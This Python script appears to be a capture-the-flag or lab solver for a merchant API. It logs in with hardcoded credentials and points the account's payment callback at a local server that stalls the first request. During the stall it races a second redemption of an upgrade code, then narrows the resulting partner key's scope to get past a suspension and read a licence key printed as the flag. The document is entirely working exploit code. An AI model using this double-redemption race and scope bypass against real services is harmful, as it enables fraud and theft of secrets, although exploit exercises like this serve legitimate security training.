#!/usr/bin/env python3

import argparse
import re
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests

UPGRADE_CODE = "SLP-PTNR-7K2Q"
CREDENTIALS = {"merchant": "halden.co", "password": "slopter2026"}


class Till(BaseHTTPRequestHandler):
    gate = threading.Event()
    seen = threading.Semaphore(0)
    hits = 0
    lock = threading.Lock()

    def do_POST(self):
        self.rfile.read(int(self.headers.get("content-length", 0)))
        with Till.lock:
            Till.hits += 1
            first = Till.hits == 1
        Till.seen.release()
        if first:
            Till.gate.wait(30)
        self.send_response(200)
        self.send_header("content-length", "0")
        self.end_headers()

    def log_message(self, *args):
        pass


def routable_address(target):
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    probe.connect((target, 80))
    address = probe.getsockname()[0]
    probe.close()
    return address


def start_till(bind):
    server = ThreadingHTTPServer((bind, 0), Till)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, server.server_address[1]


def sign_in(session, base):
    try:
        response = session.post(f"{base}/api/login", json=CREDENTIALS, timeout=10)
    except requests.RequestException as error:
        raise SystemExit(f"cannot reach {base}: {error.__class__.__name__}")
    if not response.ok:
        raise SystemExit(f"login returned {response.status_code}: {response.text[:120]}")


def redeem_twice(session, base, till_url):
    session.patch(f"{base}/api/me", json={"tillUrl": till_url}, timeout=10).raise_for_status()

    def redeem():
        return session.post(f"{base}/api/redeem", json={"code": UPGRADE_CODE}, timeout=60)

    with ThreadPoolExecutor(max_workers=2) as pool:
        held = pool.submit(redeem)
        Till.seen.acquire(timeout=20)
        passer = pool.submit(redeem)
        Till.seen.acquire(timeout=20)
        Till.gate.set()
        return held.result(), passer.result()


def partner_key(session, base):
    keys = session.get(f"{base}/api/me", timeout=10).json()["keys"]
    for key in keys:
        if "settings:read" in key["scope"]:
            return key
    raise SystemExit("no settings:read key was issued, the second redemption did not land")


def outcome(response):
    body = response.json()
    return body.get("message") or body.get("error") or response.text[:80]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("base", nargs="?", default="http://127.0.0.1:9998")
    parser.add_argument("--callback-host")
    parser.add_argument("--bind", default="0.0.0.0")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    host = args.callback_host or routable_address(
        re.sub(r"^https?://", "", base).split(":")[0]
    )
    server, port = start_till(args.bind)
    till_url = f"http://{host}:{port}/till"

    session = requests.Session()
    sign_in(session, base)
    print(f"[1]   account     {CREDENTIALS['merchant']}")
    print(f"[2]   till        {till_url}")

    held, passer = redeem_twice(session, base, till_url)
    print(f"[2]   redeem      {held.status_code}  {outcome(held)}")
    print(f"[2]   redeem      {passer.status_code}  {outcome(passer)}")

    key = partner_key(session, base)
    print(f"[2]   issued      {key['id']}  {' '.join(key['scope'])}")

    blocked = session.get(
        f"{base}/api/settings", headers={"X-Api-Key": key["id"]}, timeout=10
    )
    print(f"[3]   suspended   {blocked.status_code}  {outcome(blocked)}")

    narrowed = session.post(
        f"{base}/api/keys/{key['id']}/narrow", json={"scope": ["settings:read"]}, timeout=10
    )
    if not narrowed.ok:
        raise SystemExit(f"narrow returned {narrowed.status_code}: {narrowed.text[:120]}")
    print(f"[4]   narrowed    {' '.join(narrowed.json()['scope'])}")

    settings = session.get(
        f"{base}/api/settings", headers={"X-Api-Key": key["id"]}, timeout=10
    )
    server.shutdown()
    if not settings.ok:
        raise SystemExit(f"settings returned {settings.status_code}: {settings.text[:120]}")

    flag = settings.json().get("Licence key")
    if not flag:
        raise SystemExit("settings came back without a licence key")
    print(f"[4]   flag        {flag}")


if __name__ == "__main__":
    main()
